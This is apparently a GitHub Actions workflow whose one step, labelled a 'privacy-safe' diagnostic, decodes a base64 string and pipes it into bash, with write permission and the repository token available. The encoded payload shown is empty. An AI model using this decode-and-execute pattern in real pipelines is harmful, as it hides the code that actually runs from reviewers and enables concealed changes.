name: Temporary sole-trader type-code diagnostic

on:
  push:
    branches:
      - work/proffera-sole-trader-type-code-diagnostic

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: work/proffera-sole-trader-type-code-diagnostic
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Apply privacy-safe type-code diagnostic
        run: echo '' | base64 -d | bash
